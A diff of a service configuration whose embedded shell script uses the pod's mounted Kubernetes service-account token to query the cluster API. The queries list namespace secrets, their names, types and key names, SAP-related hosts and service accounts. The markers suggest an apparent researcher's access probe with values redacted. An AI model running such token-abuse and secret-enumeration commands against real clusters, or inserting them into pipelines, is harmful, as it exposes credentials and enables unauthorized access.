@@ -12,19 +12,18 @@ service:
           NS=$(cat $T/namespace)
           K=https://kubernetes.default.svc
           A="Authorization: Bearer $(cat $T/token)"
-          echo "KPRULES7788-NS=$NS"
-          curl -s -o /tmp/s2 -w 'KPRULES7788-SECRETS-HTTP=%{http_code}\n' --cacert $T/ca.crt -H "$A" $K/api/v1/namespaces/$NS/secrets
-          echo "KPRULES7788-SECRETS-BYTES=$(wc -c < /tmp/s2)"
-          echo "KPRULES7788-SECRETS-KIND=$(grep -o '"kind":"[A-Za-z]*"' /tmp/s2 | head -1)"
-          echo "KPRULES7788-SECRETS-ITEMCOUNT=$(grep -o '"uid":"' /tmp/s2 | wc -l)"
-          echo "KPRULES7788-SECRETS-HEAD:"
-          head -c 300 /tmp/s2
-          echo ""
-          echo "KPRULES7788-NSDENY-BODY:"
-          curl -s --cacert $T/ca.crt -H "$A" $K/api/v1/namespaces | head -c 400
-          echo ""
-          echo "KPRULES7788-RULESREVIEW:"
-          curl -s -X POST --cacert $T/ca.crt -H "$A" -H 'Content-Type: application/json' -d "{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"namespace\":\"$NS\"}}" $K/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -o /tmp/r1 -w 'KPRULES7788-RR-HTTP=%{http_code}\n'
-          cat /tmp/r1
-          echo ""
-          echo "KPRULES7788-DONE"
+          echo "KPSEC7788-NS=$NS"
+          curl -s -o /tmp/s -w 'KPSEC7788-LIST-HTTP=%{http_code}\n' --cacert $T/ca.crt -H "$A" $K/api/v1/namespaces/$NS/secrets
+          echo "KPSEC7788-LIST-BYTES=$(wc -c < /tmp/s)"
+          echo "KPSEC7788-SECRET-NAMES:"
+          grep -o '"name": "[^"]*"' /tmp/s | sort -u
+          echo "KPSEC7788-SECRET-TYPES:"
+          grep -o '"type": "[^"]*"' /tmp/s | sort -u
+          echo "KPSEC7788-DATA-KEYNAMES-ONLY:"
+          grep -oE '^ +"[A-Za-z0-9._-]+": "[A-Za-z0-9+/=]{40,}"' /tmp/s | sed -E 's/: ".*/: <redacted-by-researcher>/' | sort -u
+          echo "KPSEC7788-ANNOTATION-HOSTS:"
+          grep -oE '(docker-hub|repositories|\.cloud\.sap|\.hana\.ondemand\.com)[A-Za-z0-9./-]*' /tmp/s | sort -u | head -10
+          echo "KPSEC7788-SHA256-OF-WHOLE-LIST=$(sha256sum < /tmp/s | cut -c1-16)"
+          echo "KPSEC7788-SERVICEACCOUNTS-HTTP=$(curl -s -o /tmp/sa -w '%{http_code}' --cacert $T/ca.crt -H "$A" $K/api/v1/namespaces/$NS/serviceaccounts)"
+          grep -o '"name": "[^"]*"' /tmp/sa | sort -u | head -10
+          echo "KPSEC7788-DONE"
